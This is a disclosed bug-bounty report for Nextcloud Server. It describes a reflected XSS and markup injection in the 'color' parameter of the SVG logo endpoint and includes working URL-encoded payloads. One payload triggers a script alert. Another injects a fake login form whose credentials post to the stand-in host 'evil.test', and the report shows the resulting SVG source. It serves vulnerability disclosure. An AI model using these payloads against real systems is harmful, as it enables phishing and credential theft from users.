# Reflected XSS / Markup Injection in `index.php/svg/core/logo/logo` parameter `color`

## Report Details
- **Report ID**: 605915
- **URL**: https://hackerone.com/reports/605915
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-11T12:15:58.642Z
- **Disclosed**: 2019-08-29T20:01:03.747Z

## Reporter
- **Username**: freddyb
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
I just found a reflected Cross-Site Scripting (XSS) vulnerability in Nextcloud Server that affects current stable and dates back to at least 15.0.5.
The vulnerability seems mitigated by a Content-Security-Policy (CSP), but there might be a residual risk for phishing, due to the CSP's lack of a `form-action` directive.

Steps to repeat (for basic XSS):
0) Replace server.test in the following URLs with your own test instance of Nextcloud.
1) Open Developer Tools (alternatively, disable CSP in your browser :-))
2) go to https://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh
3) Observe the CSP violation (alternatively, the alert popup)

Steps to repeat for phishing
0) Replace server.test in the following URLS with your own test instance of Nextcloud.
1) Visit https://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22
1a) For improved readability, here's the resulting SVG source code
```html
<svg width="256" height="128" version="1.1" viewBox="0 0 256 128" xmlns="http://www.w3.org/2000/svg"><g fill="none" stroke-width="22"><circle cx="40" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/><circle cx="216" cy="64" r="26" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/><circle cx="128" cy="64" r="46" stroke="#fff"/><foreignObject class="node" x="0" y="0" width="600" height="600"><div xmlns="http://www.w3.org/1999/xhtml"><p>Login</p><form action="//evil.test"><input placeholder="Username" type="text"/><br/> <input placeholder="Password" type="text" /><br/><input type="submit" value="Login" /></form></div></foreignObject><circle alt="" fill="none"/></g></svg>

```
2) Observe how we injected a login form that points to https://evil.test. Note that further styling using CSS files of the currently applied theme could be used to make the attack more convincing. Additionally, an attacker might put the Nextcloud instance into an iframe, to hide the injection from the address bar (depending on X-Frame-Options header).

## Impact

- Phishing
- XSS on the nextcloud instance, if the CSP is bypassed (rather unlikely)

## Attachments
No attachments
